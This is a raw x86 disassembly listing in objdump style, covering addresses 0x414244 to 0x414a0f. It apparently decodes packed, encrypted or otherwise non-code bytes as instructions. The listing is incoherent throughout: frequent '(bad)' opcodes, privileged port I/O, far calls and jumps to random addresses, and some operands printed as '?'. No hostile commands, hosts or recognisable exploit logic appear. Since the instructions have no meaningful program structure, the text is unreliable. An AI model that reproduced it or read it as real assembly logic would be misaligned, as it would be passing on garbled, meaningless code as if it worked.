  414244:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414245:	test   ebx,esi
  414247:	lea    ecx,[edi]
  414249:	jno    0x414268
  41424b:	dec    edi
  41424c:	pop    es
  41424d:	and    al,0xab
  41424f:	ins    DWORD PTR es:[edi],dx
  414250:	mov    eax,ds:0x6b895654
  414255:	(bad)
  414258:	(bad)  
  41425a:	mov    ecx,0xa27313f0
  41425f:	cmp    al,0x82
  414261:	cmp    DWORD PTR [esi+0x34900a14],0x75978eb1
  41426b:	push   ebp
  41426c:	pop    edi
  41426d:	mov    dl,0xe5
  41426f:	fdiv   QWORD PTR [edx+0x5d0f29e]
  414275:	fimul  DWORD PTR ds:0x52b82fcc
  41427b:	sub    eax,0x2a60deb2
  414280:	mov    es,esi
  414282:	stos   DWORD PTR es:[edi],eax
  414283:	jo     0x4142fb
  414285:	push   edi
  414286:	mul    edi
  414288:	call   0x8ca64538
  41428d:	and    BYTE PTR [ebp+ecx*1+0x10114667],dh
  414294:	popf   
  414295:	adc    ecx,DWORD PTR [edi-0x614fa76c]
  41429b:	add    DWORD PTR [eax],0xf045a411
  4142a1:	dec    esi
  4142a2:	loop   0x414255
  4142a4:	fstp   TBYTE PTR [eax]
  4142a6:	xor    eax,0x88e6ec9f
  4142ab:	inc    edi
  4142ac:	scas   al,BYTE PTR es:[edi]
  4142ad:	ja     0x414299
  4142af:	cmp    BYTE PTR [ebp+0x5ad2f6d6],bh
  4142b5:	call   0x5cb3:0xe666ee1a
  4142bc:	aaa    
  4142bd:	add    dl,BYTE PTR [edi+0x1d]
  4142c0:	ss pop edx
  4142c2:	dec    ebp
  4142c3:	xchg   edx,eax
  4142c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142c5:	cli    
  4142c6:	jge    0x414302
  4142c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142c9:	cmp    DWORD PTR [esi+ebx*2-0x35],ecx
  4142cd:	ja     0x41427c
  4142cf:	fsubr  QWORD PTR [edx]
  4142d1:	adc    eax,0x7870de18
  4142d6:	xor    ch,BYTE PTR [edx+0x3c]
  4142d9:	mov    edi,0x188960ea
  4142de:	inc    edx
  4142df:	pop    ecx
  4142e0:	mov    ebp,0x1885e56e
  4142e5:	popf   
  4142e6:	dec    esp
  4142e7:	in     eax,0xd1
  4142e9:	and    edi,DWORD PTR [ebx+0xe]
  4142ec:	daa    
  4142ed:	inc    ecx
  4142ee:	retf   
  4142ef:	fcmovu st,st(3)
  4142f1:	imul   ebx,ebp,0x103c8cea
  4142f7:	retf   
  4142f8:	(bad)  
  4142f9:	lods   eax,DWORD PTR ds:[esi]
  4142fa:	stos   DWORD PTR es:[edi],eax
  4142fb:	adc    DWORD PTR [esi+esi*1+0x19],esp
  4142ff:	iret   
  414300:	jmp    0xf464:0x27bebe72
  414307:	inc    edi
  414308:	mov    ds:0x33aae3ad,eax
  41430d:	sbb    DWORD PTR [esi],eax
  41430f:	mov    esp,0x70c1bb16
  414314:	(bad)  
  414316:	inc    edx
  414317:	loopne 0x414367
  414319:	aad    0x2d
  41431b:	jle    0x414300
  41431d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41431e:	scas   eax,DWORD PTR es:[edi]
  41431f:	adc    BYTE PTR [esi+0x58ce3dcb],dl
  414325:	clc    
  414326:	repnz sahf 
  414328:	loop   0x4143a6
  41432a:	xor    DWORD PTR [ebp+0x7ee08aa3],esp
  414330:	sub    edi,ecx
  414332:	imul   edx,DWORD PTR [edx],0xe53db619
  414338:	repnz loopne 0x4142e5
  41433b:	push   edx
  41433c:	not    BYTE PTR [ecx+0xe]
  41433f:	mov    esi,0xdf6a6f4a
  414344:	retf   
  414345:	jmp    FWORD PTR ds:0x18bc950b
  41434b:	jge    0x41435a
  41434d:	xchg   ebx,eax
  41434e:	xchg   BYTE PTR [edx],bl
  414350:	mov    esp,0x8d295f39
  414355:	test   BYTE PTR [eax-0x5d],0xca
  414359:	ins    DWORD PTR es:[edi],dx
  41435a:	push   ds
  41435b:	lock push ecx
  41435d:	xchg   BYTE PTR [ebx+0x2918fe60],cl
  414363:	stos   DWORD PTR es:[edi],eax
  414364:	nop
  414365:	and    DWORD PTR [ecx+eiz*4],edi
  414368:	sbb    BYTE PTR [edx+0x79],dl
  41436b:	mov    gs:0xf0509361,al
  414371:	pop    es
  414372:	(bad)  
  414373:	outs   dx,DWORD PTR ds:[esi]
  414374:	out    dx,eax
  414375:	sbb    bh,BYTE PTR [esp+ebp*1+0x7eec0c8d]
  41437c:	xchg   edx,eax
  41437d:	shl    eax,cl
  41437f:	adc    bl,BYTE PTR [ecx-0x7651eff5]
  414385:	mov    ds:0x17c93aec,eax
  41438a:	adc    dx,bp
  41438d:	mov    cl,0xa5
  41438f:	pop    es
  414390:	jmp    0x4143ec
  414392:	add    edx,DWORD PTR [eax+0x12d4a2e3]
  414398:	or     DWORD PTR [esp+edx*1-0x6bf0d0d1],ecx
  41439f:	add    DWORD PTR [ebx+0x75],esi
  4143a2:	cmp    eax,0x2f9b1298
  4143a7:	mov    esp,?
  4143a9:	fwait
  4143aa:	jg     0x4143b7
  4143ac:	(bad)  
  4143ad:	dec    edx
  4143ae:	cmp    DWORD PTR [eax],esi
  4143b0:	mov    edi,ebp
  4143b2:	in     al,0xd7
  4143b4:	loop   0x4143a8
  4143b6:	adc    al,0x4d
  4143b8:	push   edi
  4143b9:	jb     0x41443a
  4143bb:	push   ebx
  4143bc:	sti    
  4143bd:	test   al,0xfd
  4143bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143c0:	and    DWORD PTR [ecx+0x1e],edx
  4143c3:	mov    ecx,0x1fe0bbf
  4143c8:	or     BYTE PTR [ebx+0x2d],0x2c
  4143cc:	and    BYTE PTR [ecx+edx*4],cl
  4143cf:	and    BYTE PTR [edi-0x35],ch
  4143d2:	(bad)  
  4143d3:	mov    ebp,?
  4143d5:	inc    ecx
  4143d6:	inc    esi
  4143d7:	xchg   ecx,eax
  4143d8:	mov    esi,0xbcfc9735
  4143dd:	or     ecx,ecx
  4143df:	stos   BYTE PTR es:[edi],al
  4143e0:	repnz (bad) 
  4143e2:	jae    0x4143c4
  4143e4:	iret   
  4143e5:	dec    edx
  4143e6:	push   ebx
  4143e7:	ins    BYTE PTR es:[edi],dx
  4143e8:	popa   
  4143e9:	je     0x41442c
  4143eb:	dec    eax
  4143ec:	adc    dl,BYTE PTR [ebp+0x23470055]
  4143f2:	mov    esi,0x5566a707
  4143f8:	or     bh,BYTE PTR [eax+0x63eb2520]
  4143fe:	pop    edx
  4143ff:	stos   DWORD PTR es:[edi],eax
  414400:	leave  
  414401:	inc    edi
  414402:	(bad)  
  414403:	les    ecx,FWORD PTR [ebx-0x46a330df]
  414409:	aad    0x35
  41440b:	mov    edx,0xc76e8369
  414410:	mov    bl,0x7
  414412:	or     esi,eax
  414414:	in     eax,0xe6
  414416:	(bad)  
  414417:	retf   
  414418:	xchg   esi,eax
  414419:	xor    BYTE PTR [eax+eiz*4-0x4c],ch
  41441d:	(bad)  
  41441e:	mov    ecx,0x4298d475
  414423:	dec    ecx
  414424:	add    eax,0xcc99b864
  414429:	out    0x80,eax
  41442b:	push   ebp
  41442c:	popa   
  41442d:	cmp    esi,DWORD PTR [eax-0x1e]
  414430:	jp     0x4143bc
  414432:	enter  0x2d74,0x24
  414436:	mov    al,0x17
  414438:	cmp    al,0xac
  41443a:	dec    esp
  41443b:	inc    ebp
  41443c:	test   BYTE PTR [esi+eiz*1+0x5421421b],ah
  414443:	out    0x5c,eax
  414445:	jecxz  0x414422
  414447:	call   DWORD PTR [esi+0xf3ac10a]
  41444d:	inc    esi
  41444e:	add    BYTE PTR [ebx],cl
  414450:	mov    WORD PTR [edi],cs
  414452:	loope  0x4144a9
  414454:	stos   DWORD PTR es:[edi],eax
  414455:	jns    0x4144a0
  414457:	ds (bad) 
  414459:	jns    0x414448
  41445b:	in     eax,dx
  41445c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41445d:	emms   
  41445f:	cmc    
  414460:	or     bh,bh
  414462:	adc    cl,BYTE PTR [esi+0x1f735a66]
  414468:	and    DWORD PTR [esi],edx
  41446a:	lds    ebx,FWORD PTR [edx-0xa583dc]
  414470:	push   ss
  414471:	inc    esp
  414472:	clc    
  414473:	test   eax,0x36fd5ab8
  414478:	jge    0x41448f
  41447a:	not    BYTE PTR [eax]
  41447c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41447d:	mov    ebp,0x89aeaece
  414482:	jg     0x41445b
  414484:	out    0x20,eax
  414486:	adc    al,0x38
  414488:	mov    WORD PTR [ebx-0x7c5b440d],ds
  41448e:	add    dl,0x76
  414491:	dec    esi
  414492:	pop    esp
  414493:	addr16 and eax,0x641fd7c2
  414499:	sbb    al,0x5c
  41449b:	sub    BYTE PTR [eax-0x452a3ea],ch
  4144a1:	adc    al,0x47
  4144a3:	addr16 jno 0x41451d
  4144a6:	mov    ecx,0xa2d2f1f0
  4144ab:	retf   0xda3e
  4144ae:	jle    0x414527
  4144b0:	mov    al,BYTE PTR [edi+0x48f033fd]
  4144b6:	data16 fwait
  4144b8:	cmp    al,0x99
  4144ba:	lahf   
  4144bb:	and    BYTE PTR [eax+0x6b],dl
  4144be:	mov    ah,0xc5
  4144c0:	pop    ecx
  4144c1:	jmp    0xe8dae379
  4144c6:	sbb    esp,eax
  4144c8:	icebp  
  4144c9:	pop    esi
  4144ca:	test   eax,0x8c1fc973
  4144cf:	rol    DWORD PTR [esi+0x5f83258c],0xcf
  4144d6:	cmp    ch,cl
  4144d8:	add    dh,BYTE PTR [ecx+0x6fb33d92]
  4144de:	dec    edi
  4144df:	pop    ebx
  4144e0:	les    edx,FWORD PTR [ebx]
  4144e2:	test   eax,0x1bd051d7
  4144e7:	es rcl edi,1
  4144ea:	enter  0xade0,0xcc
  4144ee:	inc    eax
  4144ef:	call   0xd9ee58eb
  4144f4:	xchg   DWORD PTR [edx+esi*2-0x2a],esp
  4144f8:	lahf   
  4144f9:	imul   edi,DWORD PTR [edi],0xdc22cc23
  4144ff:	lock vpinsrw xmm1,xmm7,WORD PTR ss:[esi+0x2fe796b5],0xd9
  41450a:	push   edi
  41450b:	cmp    eax,0xafb93c9a
  414510:	push   es
  414511:	repz xor eax,0xab273867
  414517:	cdq    
  414518:	pusha  
  414519:	mov    esi,0xb29957c6
  41451e:	cli    
  41451f:	mov    eax,eax
  414521:	or     ebx,DWORD PTR [ebx+0x7035d1d]
  414527:	sub    al,0xd
  414529:	xor    DWORD PTR ds:0xf50ea126,edi
  41452f:	or     BYTE PTR [edi+0x16],bl
  414532:	adc    ebp,DWORD PTR [ebx]
  414534:	xchg   DWORD PTR [edi+0x3f],edi
  414537:	dec    edi
  414538:	fsubrp st(7),st
  41453a:	emms   
  41453c:	mov    cl,0x3e
  41453e:	adc    DWORD PTR ds:0xb8d67cc4,edx
  414544:	daa    
  414545:	fsub   DWORD PTR [esi+ebx*2]
  414548:	gs out 0xc3,al
  41454b:	outs   dx,BYTE PTR ds:[esi]
  41454c:	push   ecx
  41454d:	in     eax,0x5d
  41454f:	fldcw  WORD PTR [ebx+0x7d209884]
  414555:	popf   
  414556:	leave  
  414557:	cmp    bh,BYTE PTR [ecx]
  414559:	xor    DWORD PTR [eax+0x6b4dd526],ebp
  41455f:	sbb    ah,ah
  414561:	and    bh,ah
  414563:	ss out 0xf6,al
  414566:	loopne 0x4145be
  414568:	cld    
  414569:	adc    ebp,DWORD PTR [edx]
  41456b:	and    al,0x5a
  41456d:	fnsave [edi-0x17ddbfba]
  414573:	rcr    esi,cl
  414575:	stos   DWORD PTR es:[edi],eax
  414576:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414577:	push   edx
  414578:	(bad)  
  414579:	dec    edi
  41457a:	ins    DWORD PTR es:[edi],dx
  41457b:	gs push ecx
  41457d:	out    dx,al
  41457e:	xchg   edx,eax
  41457f:	inc    edi
  414580:	xchg   ecx,eax
  414581:	repz mov esp,0x6748a35c
  414587:	jne    0x414556
  414589:	fwait
  41458a:	out    dx,eax
  41458b:	es stos DWORD PTR es:[edi],eax
  41458d:	mov    al,ds:0x2815ac0
  414592:	jne    0x4145b1
  414594:	test   DWORD PTR [ebp+0x1f453172],0x71aafe2b
  41459e:	inc    esi
  41459f:	xchg   esi,eax
  4145a0:	add    BYTE PTR [eax+edi*1-0x11],al
  4145a4:	scas   al,BYTE PTR es:[edi]
  4145a5:	pushf  
  4145a6:	pop    es
  4145a7:	loop   0x414598
  4145a9:	data16 jecxz 0x414566
  4145ac:	cmc    
  4145ad:	pop    ds
  4145ae:	sbb    DWORD PTR [esi+0x597dd719],edx
  4145b4:	mov    edx,0xecb1a78f
  4145b9:	or     bh,ah
  4145bb:	pusha  
  4145bc:	scas   al,BYTE PTR es:[edi]
  4145bd:	xchg   esi,eax
  4145be:	(bad)  
  4145bf:	cmp    BYTE PTR [esi],dh
  4145c1:	in     al,dx
  4145c2:	cmp    edx,eax
  4145c4:	inc    ebx
  4145c5:	sar    BYTE PTR [edx-0x6cb18b24],1
  4145cb:	pop    ds
  4145cc:	mov    ds:0x383417aa,eax
  4145d1:	xchg   edx,eax
  4145d2:	shl    BYTE PTR [ebx-0x2],0xa3
  4145d6:	mov    ebx,0xbba42ce5
  4145db:	xchg   esp,eax
  4145dc:	adc    BYTE PTR [ebx],bl
  4145de:	pop    esi
  4145df:	icebp  
  4145e0:	xor    eax,0x96b78971
  4145e5:	repz mov ebp,0x2bd7db6c
  4145eb:	add    BYTE PTR [esp+edi*2-0x3a],ch
  4145ef:	dec    esp
  4145f0:	mov    BYTE PTR [esi+0x620f37b3],ah
  4145f6:	(bad)  
  4145f7:	arpl   WORD PTR [esi],sp
  4145f9:	test   eax,0x555f11ab
  4145fe:	add    eax,0x6edc06b
  414603:	sahf   
  414604:	leave  
  414605:	sar    dh,1
  414607:	rol    esp,cl
  414609:	pop    dx
  41460b:	pop    edi
  41460c:	std    
  41460d:	outs   dx,DWORD PTR ds:[esi]
  41460e:	inc    ecx
  41460f:	jp     0x4145ed
  414611:	push   cs
  414612:	pop    edx
  414613:	sub    DWORD PTR [edx+ebx*4-0x7d5956d2],0x67
  41461b:	popf   
  41461c:	cdq    
  41461d:	loopne 0x414689
  41461f:	mov    eax,ecx
  414621:	dec    eax
  414622:	push   edx
  414623:	xchg   edi,eax
  414624:	xchg   ebp,eax
  414625:	inc    eax
  414626:	push   ebp
  414627:	dec    ebp
  414628:	lea    edi,[ecx-0x35e940a7]
  41462e:	bswap  eax
  414630:	cld    
  414631:	pop    es
  414632:	dec    esp
  414633:	inc    ebx
  414634:	leave  
  414635:	cmp    DWORD PTR ds:0xc62a4762,edx
  41463b:	js     0x4146a2
  41463d:	(bad)  
  41463e:	cdq    
  41463f:	mov    al,0xf2
  414641:	push   DWORD PTR [esi-0x1aeac7b9]
  414647:	pop    ss
  414648:	push   ecx
  414649:	add    eax,0x4c9d321c
  41464e:	xchg   esi,eax
  41464f:	bound  esp,QWORD PTR [ebx]
  414651:	sbb    edx,DWORD PTR [edi+0x3d]
  414654:	xchg   ecx,eax
  414655:	jl     0x4146bb
  414657:	call   0xf0e1da3
  41465c:	test   al,0x99
  41465e:	sbb    eax,0x3787f201
  414663:	sub    BYTE PTR [edx],al
  414665:	popa   
  414666:	call   DWORD PTR [eax+0x2600598a]
  41466c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41466d:	jle    0x414601
  41466f:	fwait
  414670:	neg    DWORD PTR [edx-0x234bbc60]
  414676:	mov    ds:0x8b20df46,al
  41467b:	jo     0x414669
  41467d:	jl     0x414687
  41467f:	inc    esi
  414680:	and    al,0x10
  414682:	xor    eax,0x799209f7
  414687:	out    dx,al
  414688:	mov    edx,0x66c58b3
  41468d:	sub    dl,BYTE PTR [esi-0xc]
  414690:	leave  
  414691:	push   esi
  414692:	dec    ecx
  414693:	mov    DWORD PTR [eax+0x44],esp
  414696:	popf   
  414697:	sar    DWORD PTR [ecx],0x40
  41469a:	in     eax,dx
  41469b:	(bad)  
  41469c:	mov    al,0xa6
  41469e:	jecxz  0x414632
  4146a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146a1:	xchg   ecx,eax
  4146a2:	repz int3 
  4146a4:	ret    
  4146a5:	inc    ecx
  4146a6:	lahf   
  4146a7:	pop    ebx
  4146a8:	cli    
  4146a9:	cs imul eax,edx,0x81504ba0
  4146b0:	(bad)  
  4146b1:	pop    eax
  4146b2:	sub    BYTE PTR [edx+0x1368e19d],dh
  4146b8:	cmp    bh,ah
  4146ba:	xor    ecx,DWORD PTR [ebp+eiz*2-0x57d9a16e]
  4146c1:	adc    eax,0xf633d95f
  4146c7:	pop    esi
  4146c8:	(bad)  
  4146c9:	mov    ah,0xe9
  4146cb:	leave  
  4146cc:	ss retf 
  4146ce:	scas   al,BYTE PTR es:[edi]
  4146cf:	popa   
  4146d0:	pop    edi
  4146d1:	add    BYTE PTR [ebx*4+0x67154eb4],dl
  4146d8:	int    0x26
  4146da:	cmp    ch,al
  4146dc:	dec    edi
  4146dd:	shr    DWORD PTR [ebx+ebp*4+0x29c1c13c],0xa3
  4146e5:	jne    0x4146d9
  4146e7:	xchg   ebx,eax
  4146e8:	(bad)  
  4146e9:	pop    esi
  4146ea:	hlt    
  4146eb:	or     ah,ch
  4146ed:	pop    edi
  4146ee:	jge    0x41474b
  4146f0:	and    DWORD PTR [edi-0x4d],0x1
  4146f4:	inc    eax
  4146f5:	mov    dh,BYTE PTR [ebp+eiz*4-0x6df5993b]
  4146fc:	xchg   BYTE PTR [esi-0x24b18471],al
  414702:	sub    BYTE PTR [edx],al
  414704:	test   DWORD PTR [edx+0xb],eax
  414707:	lahf   
  414708:	xchg   esp,eax
  414709:	shl    BYTE PTR [ebx+eiz*8],cl
  41470c:	ror    BYTE PTR [ecx],0x1f
  41470f:	jbe    0x414772
  414711:	test   BYTE PTR [esi],0x63
  414714:	stos   DWORD PTR es:[edi],eax
  414715:	shl    DWORD PTR [edi+0x1948a1d9],1
  41471b:	mov    ch,0xa0
  41471d:	outs   dx,BYTE PTR ds:[esi]
  41471e:	xchg   DWORD PTR [ebx+0x68],ebp
  414721:	les    ecx,FWORD PTR [ecx-0x76]
  414724:	lock jmp 0x414776
  414727:	add    al,0xbd
  414729:	ja     0x4146bb
  41472b:	aas    
  41472c:	outs   dx,DWORD PTR ds:[esi]
  41472d:	inc    edi
  41472e:	stos   DWORD PTR es:[edi],eax
  41472f:	xchg   cl,cl
  414731:	dec    eax
  414732:	lea    esp,[eax]
  414734:	mov    edi,0xf04cb9b1
  414739:	inc    esi
  41473a:	inc    esi
  41473b:	mov    esp,ecx
  41473d:	mov    ds:0x104e4a18,al
  414742:	sub    BYTE PTR ds:[ebp-0x7f],dl
  414746:	lds    esp,FWORD PTR [edx]
  414748:	mov    ebp,DWORD PTR [ecx-0x65]
  41474b:	cmp    ebp,ebp
  41474d:	sbb    DWORD PTR [ebp+0x8],ecx
  414750:	cmp    eax,0xdcd7029
  414755:	inc    edi
  414756:	pop    ds
  414757:	jle    0x4147c6
  414759:	pop    ss
  41475a:	mov    al,ds:0xeb15a243
  41475f:	pop    ds
  414760:	dec    edi
  414761:	push   edx
  414762:	pusha  
  414763:	shl    DWORD PTR [ecx+eiz*1],0xe0
  414767:	inc    ebx
  414768:	rcl    BYTE PTR [eax],1
  41476a:	mov    ds:0xea9396a1,al
  41476f:	mov    eax,DWORD PTR [esi]
  414771:	xchg   edx,eax
  414772:	sbb    BYTE PTR [eax-0x6c434e40],cl
  414778:	cmp    dh,BYTE PTR ds:0xe1a8e522
  41477e:	jl     0x414708
  414780:	pop    es
  414781:	xor    al,0xea
  414783:	jecxz  0x41474b
  414785:	or     eax,0x3ea7eadc
  41478a:	push   ecx
  41478b:	mov    dl,0x4b
  41478d:	xor    edi,DWORD PTR [ebp-0x19262b81]
  414793:	cs repnz ins DWORD PTR es:[edi],dx
  414796:	rcl    DWORD PTR [esi],cl
  414798:	in     al,dx
  414799:	xor    DWORD PTR [esp+edx*8+0x2e1dcb10],0x4d3ffe01
  4147a4:	sub    eax,0x570f5e6c
  4147a9:	mov    ds:0xdc939b83,al
  4147ae:	xchg   edx,eax
  4147af:	pushf  
  4147b0:	rcr    DWORD PTR [edx+0x4d],cl
  4147b3:	push   ebx
  4147b4:	inc    eax
  4147b5:	cmp    BYTE PTR [esi-0x683928f5],0x8d
  4147bc:	iret   
  4147bd:	(bad)  
  4147be:	cmp    eax,0x9b4319c
  4147c3:	push   ss
  4147c4:	sub    BYTE PTR [esi],cl
  4147c6:	mov    eax,0x511e9c21
  4147cb:	jecxz  0x414799
  4147cd:	adc    BYTE PTR [edi+0x7f],ch
  4147d0:	xor    BYTE PTR [edi],ah
  4147d2:	jmp    0x414764
  4147d4:	jecxz  0x4147e4
  4147d6:	es cmp al,0xe6
  4147d9:	fwait
  4147da:	call   0x1e24:0x8dc40080
  4147e1:	sub    DWORD PTR [edx],esi
  4147e3:	leave  
  4147e4:	test   eax,0xf1e0b507
  4147e9:	dec    esi
  4147ea:	jbe    0x41484b
  4147ec:	or     al,0x22
  4147ee:	jnp    0x41483f
  4147f0:	gs (bad) 
  4147f3:	outs   dx,BYTE PTR ds:[esi]
  4147f4:	mov    al,ds:0x4512088d
  4147f9:	dec    edx
  4147fa:	push   eax
  4147fb:	xchg   edx,eax
  4147fc:	jb     0x4147e6
  4147fe:	fisubr DWORD PTR [edx-0x1b]
  414801:	push   ebx
  414802:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414803:	dec    esi
  414804:	dec    ecx
  414805:	je     0x4147e2
  414807:	mov    ds,WORD PTR [edi+0x5f87cc01]
  41480d:	(bad)  
  41480e:	xchg   ebp,eax
  41480f:	dec    edi
  414810:	mov    al,0x29
  414812:	jo     0x41482f
  414814:	cdq    
  414815:	rcl    BYTE PTR [ebx+0x6ef60ca6],0x58
  41481c:	dec    edx
  41481d:	jns    0x4147e1
  41481f:	pop    ebp
  414820:	add    cl,BYTE PTR [esi+0x7e36b3f2]
  414826:	ja     0x41480a
  414828:	fs mov bl,0xcf
  41482b:	imul   ecx,DWORD PTR [edx],0x6d
  41482e:	mov    dl,0x94
  414830:	push   cs
  414831:	jns    0x4147c5
  414833:	push   cs
  414834:	pop    edi
  414835:	ss mov dh,0x46
  414838:	adc    eax,0xfefbe453
  41483d:	add    dh,bh
  41483f:	in     eax,0xc2
  414841:	add    dh,BYTE PTR ds:0x50a31625
  414847:	mov    edx,0xb09ca95b
  41484c:	(bad)  
  41484d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41484e:	or     edx,eax
  414850:	jg     0x41482c
  414852:	sub    esi,edx
  414854:	inc    esi
  414855:	fcomp  QWORD PTR [ebx]
  414857:	repz test BYTE PTR ds:0xb8e63336,0x66
  41485f:	add    edi,DWORD PTR cs:[edi-0x11]
  414863:	cmovl  edx,DWORD PTR [ebx+0x5d44cfb7]
  41486a:	xor    DWORD PTR [esp+esi*1],edx
  41486d:	fs xchg ebp,eax
  41486f:	jmp    FWORD PTR [eax-0x25edd567]
  414875:	ds (bad) 
  414877:	jmp    0x414831
  414879:	enter  0x3870,0xf0
  41487d:	sub    eax,0x2377ae56
  414882:	jmp    0x4c3f9a2e
  414887:	mov    dh,0x99
  414889:	test   eax,0x5fb882e3
  41488e:	push   edi
  41488f:	imul   BYTE PTR [ebx]
  414891:	scas   al,BYTE PTR es:[edi]
  414892:	or     DWORD PTR [ecx-0x58],ebx
  414895:	(bad)  
  414896:	(bad)  
  414897:	scas   al,BYTE PTR es:[edi]
  414898:	(bad)  
  414899:	mov    ebp,0x64d3e927
  41489e:	or     DWORD PTR [ebx+0x4],0xffffffe4
  4148a2:	inc    edx
  4148a3:	shl    DWORD PTR [edi],cl
  4148a5:	add    DWORD PTR ds:0x245a8ed3,esp
  4148ab:	fld    TBYTE PTR [edx]
  4148ad:	xor    bh,dh
  4148af:	jmp    0x4148a0
  4148b1:	cmp    eax,0x1c6392bc
  4148b6:	push   esp
  4148b7:	pop    esp
  4148b8:	adc    ecx,ebx
  4148ba:	sti    
  4148bb:	cmp    eax,0x987a1c8e
  4148c0:	mov    ebx,0xc089d42
  4148c5:	enter  0x16a7,0x24
  4148c9:	mov    ds:0xbf7f8c60,al
  4148ce:	fmul   QWORD PTR [edi+0x7]
  4148d1:	jmp    0x4e94038c
  4148d6:	mov    ebx,0x9a7456b5
  4148db:	sub    esi,DWORD PTR [edi-0x7c]
  4148de:	sbb    eax,DWORD PTR [ebx+eax*1-0x3]
  4148e2:	or     BYTE PTR [eax],cl
  4148e4:	jecxz  0x4148fd
  4148e6:	loopne 0x4148de
  4148e8:	fisttp DWORD PTR [esi]
  4148ea:	add    al,0xe1
  4148ec:	push   0xffffffd3
  4148ee:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148f0:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4148f2:	jp     0x414938
  4148f4:	cld    
  4148f5:	dec    edx
  4148f6:	jo     0x4148df
  4148f8:	(bad)  
  4148f9:	push   es
  4148fa:	scas   al,BYTE PTR es:[edi]
  4148fb:	mov    dl,0xa0
  4148fd:	xchg   edx,eax
  4148ff:	jb     0x4148cb
  414901:	sbb    eax,0x602a6059
  414906:	das    
  414907:	inc    eax
  414908:	ds adc edi,ebp
  41490b:	in     eax,dx
  41490c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41490d:	adc    esp,ebx
  41490f:	mov    WORD PTR [edi-0x6020b407],cs
  414915:	mov    dh,BYTE PTR [ecx-0x6d1093ba]
  41491b:	cli    
  41491c:	adc    DWORD PTR ds:0xeba1371f,esi
  414922:	pop    ecx
  414923:	imul   ebx,DWORD PTR [eax-0xf],0xffffffb8
  414927:	or     BYTE PTR [esp+ebx*8],ch
  41492a:	sub    al,0xc8
  41492c:	scas   eax,DWORD PTR es:[edi]
  41492d:	dec    ecx
  41492e:	jge    0x4148e6
  414930:	cmp    eax,0x22234f6f
  414935:	outs   dx,BYTE PTR ds:[esi]
  414936:	scas   al,BYTE PTR es:[edi]
  414937:	scas   al,BYTE PTR es:[edi]
  414938:	and    al,0x57
  41493a:	inc    eax
  41493b:	pop    ss
  41493c:	inc    esi
  41493d:	xchg   esp,eax
  41493e:	sar    DWORD PTR [esi+0x2d],0x57
  414942:	cli    
  414943:	aad    0xee
  414945:	push   esi
  414946:	add    BYTE PTR [ecx+0x5d],0x4b
  41494a:	sbb    edi,DWORD PTR [edi+0x6f1b161]
  414950:	dec    ebp
  414951:	jnp    0x4149ab
  414953:	mov    al,0x7f
  414955:	fild   QWORD PTR [eax-0x5031e02f]
  41495b:	arpl   bx,dx
  41495d:	inc    esp
  41495e:	into   
  41495f:	xchg   edi,eax
  414960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414961:	cmc    
  414962:	and    BYTE PTR [ebx+0x62],ch
  414965:	pop    ds
  414966:	out    dx,eax
  414967:	sbb    bh,BYTE PTR cs:[esp+esi*1+0x1c]
  41496c:	call   0x99b6:0x51b348a3
  414973:	add    al,0xad
  414975:	push   edi
  414976:	outs   dx,DWORD PTR ds:[esi]
  414977:	xor    BYTE PTR ss:[ebx-0x31],ch
  41497b:	pop    ds
  41497c:	mov    ebp,0x84f6cea6
  414981:	inc    esp
  414982:	dec    eax
  414983:	sbb    BYTE PTR [esi+0x49ec033f],dh
  414989:	popa   
  41498a:	frstor [edx+0x40]
  41498d:	xlat   BYTE PTR ds:[ebx]
  41498e:	add    edx,DWORD PTR [edx+0x1cc5bb47]
  414994:	or     al,0x0
  414996:	jg     0x4149cc
  414998:	icebp  
  414999:	jle    0x41497c
  41499b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41499c:	in     al,dx
  41499d:	dec    edi
  41499e:	add    BYTE PTR [ecx+esi*1-0x28c73362],cl
  4149a5:	daa    
  4149a6:	sub    dl,bl
  4149a8:	pop    esp
  4149a9:	clc    
  4149aa:	loope  0x41498b
  4149ac:	aad    0x21
  4149ae:	mov    ah,0xca
  4149b0:	xor    bh,BYTE PTR [edx*4-0x1515ac52]
  4149b7:	ins    BYTE PTR es:[edi],dx
  4149b8:	jmp    0xcfab4738
  4149bd:	(bad)  
  4149bf:	mov    dh,0xf7
  4149c1:	add    bl,BYTE PTR [eax-0x5f]
  4149c4:	cmp    eax,0x50317757
  4149c9:	pop    edx
  4149ca:	dec    esi
  4149cb:	pop    eax
  4149cc:	enter  0x5121,0x22
  4149d0:	aad    0x5e
  4149d2:	xchg   ebp,eax
  4149d3:	arpl   WORD PTR [esi-0x2],bp
  4149d6:	ja     0x414a54
  4149d8:	mov    dl,0xd7
  4149da:	aam    0x9d
  4149dc:	retf   0xdbd7
  4149df:	iret   
  4149e0:	jnp    0x414a5b
  4149e2:	xor    esi,edx
  4149e4:	test   DWORD PTR [edi-0xc957662],ebp
  4149ea:	add    bl,al
  4149ec:	mov    ds:0x7217aa59,al
  4149f1:	ins    DWORD PTR es:[edi],dx
  4149f2:	stos   BYTE PTR es:[edi],al
  4149f3:	in     al,dx
  4149f4:	adc    BYTE PTR [edi+edi*2],bh
  4149f7:	fist   DWORD PTR [ecx]
  4149f9:	dec    eax
  4149fa:	call   0x644d6b74
  4149ff:	xchg   edi,eax
  414a00:	pop    es
  414a01:	xchg   ebp,eax
  414a02:	add    dh,cl
  414a04:	jge    0x4149c3
  414a06:	imul   ecx,DWORD PTR [ebx+edi*1-0x76],0x151e0b69
  414a0e:	push   ebx
  414a0f:	xor    al,0xe8
